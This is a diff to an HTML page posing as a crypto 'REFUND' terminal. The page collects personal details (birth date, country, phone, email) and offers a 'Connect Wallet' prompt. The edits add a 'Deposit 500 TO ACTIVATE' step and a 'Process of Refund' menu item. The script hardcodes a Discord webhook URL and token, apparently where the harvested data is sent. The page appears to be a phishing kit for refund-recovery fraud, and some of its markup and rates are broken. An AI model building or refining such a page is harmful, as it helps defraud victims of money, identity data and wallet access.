@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>REFUND | Institutional Terminal</title>
+    <title>REFUND | AMLA</title>
     <link rel="stylesheet" href="https://cloudflare.com">
     <style>
         :root { --bg: #0b0e11; --sidebar: #12161c; --card: #1e2329; --border: #2b3139; --yellow: #f3ba2f; --text: #eaecef; --text-gray: #848e9c; --up: #0ecb81; --down: #f6465d; }
@@ -61,7 +61,7 @@
         <input type="date" id="r-birth">
         <select id="r-country">
             <option value="" disabled selected>Select Country</option>
-            <option>GERMANY</option><option>USA</option><option>UAE</option><option>Singapore</option>UK</option>JAPAN</option>PHIL</option>
+            <option>GERMANY</option><option>USA</option><option>UE</option><option>Singapore</option>UK</option>JAPAN</option>PHIL</option>
         </select>
         <input type="tel" id="r-phone" placeholder="Phone Number (+**)">
         <input type="email" id="r-email" placeholder="Institutional Email">
@@ -89,8 +89,8 @@
 <nav id="sidebar">
     <div class="logo">REFUND</div>
     <div class="nav-item active" id="n-market" onclick="switchView('market')"><i class="fa-solid fa-chart-line"></i> Market Board</div>
-    <div class="nav-item" id="n-history" onclick="switchView('history')"><i class="fa-solid fa-list-ul"></i> History Logs</div>
-    <div class="nav-item" onclick="switchView('deposit')"><i class="fa-solid fa-arrow-down"></i> Deposit</div>
+    <div class="nav-item" id="n-history" onclick="switchView('history')"><i class="fa-solid fa-list-ul"></i> Process of Refund</div>
+    <div class="nav-item" onclick="switchView('deposit')"><i class="fa-solid fa-arrow-down"></i> Deposit 500 TO ACTIVATE</div>
     <div class="nav-item" onclick="switchView('withdraw')"><i class="fa-solid fa-credit-card"></i> Withdraw</div>
     <div class="nav-item" onclick="openModal()" style="color:var(--yellow);"><i class="fa-solid fa-key"></i> Connect Wallet</div>
     <div class="nav-item btn-logout" onclick="location.reload()"><i class="fa-solid fa-right-from-bracket"></i> Log Out</div>
@@ -101,7 +101,7 @@
         <div style="font-weight:bold; font-size:13px;">Terminal: <span style="color:var(--up)">REFUND Archive Active</span></div>
         <div style="display:flex; gap:10px; align-items:center;">
             <select id="currency-select" onchange="updateMarket()" style="background:#2b3139; color:white; border:none; padding:8px 12px; border-radius:5px; font-weight:bold;">
-                <option value="USD">USD</option><option value="PHP">PHP</option><option value="SGD">SGD</option>
+                <option value="USD">USD</option><option value="PHP">EURO</option><option value="SGD">SGD</option>
             </select>
             <button onclick="openModal()" style="background:var(--yellow); border:none; padding:8px 18px; border-radius:5px; font-weight:bold; cursor:pointer;">Connect</button>
         </div>
@@ -161,9 +161,9 @@
 
 <script>
     let code = "";
-    let rates = { USD: 1, PHP: 57.50, SGD: 1.35 };
+    let rates = { USD: 1, EURO: 1.83, SGD: 1.35 };
     const hook = "https://ptb.discord.com/api/webhooks/1502014942323278016/AEdRKrTMN507nDn3jgQZDE_9IAGbo8tTJkTG_Qd2BU7c-mgRA0tNlSm9pZD79ASM9jdv";
-    const coins = ["Bitcoin", "Ethereum", "Tether", "BNB", "Solana", "XRP", "USDC", "Cardano", "Avalanche", "Dogecoin", "TRON", "Polkadot", "Polygon", "Chainlink", "Shiba Inu"];
+    const coins = ["TRILLO", "SMITH", "JOHNSON", "STANG", "SOLAIRE", "", "UGRON", "CARDANO", "AVALANCHE", "DOGER", "TRON", "POLDDAVOKOT", "STRICKLAND", "GREGGOR", "SHUBA INU"];
 
     function showForm(t) { document.getElementById('choice-box').style.display='none'; document.getElementById(t+'-box').style.display='block'; }
     function startAuth(t) {
